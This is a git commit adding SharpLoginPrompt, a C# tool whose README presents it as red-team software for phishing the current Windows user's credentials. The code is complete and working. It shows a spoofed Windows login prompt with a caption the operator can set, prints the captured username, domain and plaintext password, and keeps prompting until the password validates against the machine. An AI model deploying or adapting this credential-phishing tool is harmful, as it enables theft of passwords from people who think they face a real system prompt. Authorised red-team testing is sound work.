18b1dfa48ae84997a6603f0eaa0227e976d5eaaf
Khandelwal <shankhandelwal@deloitte.com.hk>
2019-10-20 13:37:39 +0800

    first commit

---
+++ README.md
@@ -0,0 +1,8 @@
+# SharpLoginPrompt
+
+This Program creates a login prompt to gather username and password of the current user. This project allows red team to phish username and password of the current user without touching lsass and having adminitrator credentials on the system. 
+
+#Usage
+run <SharpLoginPrompt.exe> to launch it with default settings
+
+run <SharpLoginPrompt.exe "This is heading" "This is subheading"> to customize the login prompt 
---
+++ SharpLoginPrompt/Program.cs
@@ -0,0 +1,124 @@
+﻿using System;
+using System.Net;
+using System.DirectoryServices.AccountManagement;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace SharpLoginPrompt
+{
+    class Program
+    {
+
+        [DllImport("ole32.dll")]
+        public static extern void CoTaskMemFree(IntPtr ptr);
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        private struct CREDUI_INFO
+        {
+            public int cbSize;
+            public IntPtr hwndParent;
+            public string pszMessageText;
+            public string pszCaptionText;
+            public IntPtr hbmBanner;
+        }
+        [DllImport("credui.dll", CharSet = CharSet.Auto)]
+        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
+                                                             int authError,
+                                                             ref uint authPackage,
+                                                             IntPtr InAuthBuffer,
+                                                             uint InAuthBufferSize,
+                                                             out IntPtr refOutAuthBuffer,
+                                                             out uint refOutAuthBufferSize,
+                                                             ref bool fSave,
+                                                             int flags);
+        [DllImport("credui.dll", CharSet = CharSet.Auto)]
+        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
+                                                               IntPtr pAuthBuffer,
+                                                               uint cbAuthBuffer,
+                                                               StringBuilder pszUserName,
+                                                               ref int pcchMaxUserName,
+                                                               StringBuilder pszDomainName,
+                                                               ref int pcchMaxDomainame,
+                                                               StringBuilder pszPassword,
+                                                               ref int pcchMaxPassword);
+
+
+
+        static void Main(string[] args)
+        {
+            bool passwordOk = false;
+            while (passwordOk != true)
+            {
+
+                CREDUI_INFO credui = new CREDUI_INFO();
+                credui.pszCaptionText = args.Length ==2 ? args[0]:"Please enter the credentials";
+                credui.pszMessageText = args.Length == 2 ? args[1] : "Domain: " + (Environment.GetEnvironmentVariable("USERDOMAIN").ToString() ?? Environment.GetEnvironmentVariable("HOSTNAME").ToString());
+                credui.cbSize = Marshal.SizeOf(credui);
+                IntPtr outCredBuffer = new IntPtr();
+                uint outCredSize;
+                bool save = false;
+                uint authPackage = 0;
+
+                int result = CredUIPromptForWindowsCredentials(ref credui,
+                                                               0,
+                                                               ref authPackage,
+                                                               IntPtr.Zero,
+                                                               0,
+                                                               out outCredBuffer,
+                                                               out outCredSize,
+                                                               ref save,
+                                                               0x1
+
+    /* Generic */);
+                var usernameBuf = new StringBuilder(100);
+                var passwordBuf = new StringBuilder(100);
+                var domainBuf = new StringBuilder(100);
+
+                int maxUserName = 100;
+                int maxDomain = 100;
+                int maxPassword = 100;
+                if (result == 0)
+                {
+                    if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
+                                                       domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
+                    {
+                        CoTaskMemFree(outCredBuffer);
+                        NetworkCredential networkCredential = new NetworkCredential()
+                        {
+                            UserName = usernameBuf.ToString(),
+                            Password = passwordBuf.ToString(),
+                            Domain = domainBuf.ToString()
+
+
+                        };
+                        Console.WriteLine("Username = " + networkCredential.UserName);
+                        Console.WriteLine("Password = " + networkCredential.Password);
+                        Console.WriteLine("Doamain = " + networkCredential.Domain);
+                        string userName;
+                        if (networkCredential.UserName.ToString().Contains("\\"))
+                        {
+                            userName = networkCredential.UserName.ToString();
+                        }
+                        else
+                        {
+                            userName = (Environment.GetEnvironmentVariable("USERDOMAIN").ToString() ?? Environment.GetEnvironmentVariable("HOSTNAME").ToString()) + "\\" + networkCredential.UserName.ToString();
+                        }
+                        Console.WriteLine(userName);
+                        try
+                        {
+                            PrincipalContext pcon = new PrincipalContext(ContextType.Machine, Environment.MachineName);
+                            passwordOk = pcon.ValidateCredentials(userName, networkCredential.Password);
+                            Console.WriteLine(passwordOk);
+                        }
+                        catch (System.DirectoryServices.AccountManagement.PrincipalOperationException)
+                        {
+                            passwordOk = false;
+                            Console.WriteLine("Trying Again");
+                        }
+
+
+                    }
+                }
+            }
+        }
+    }
+}
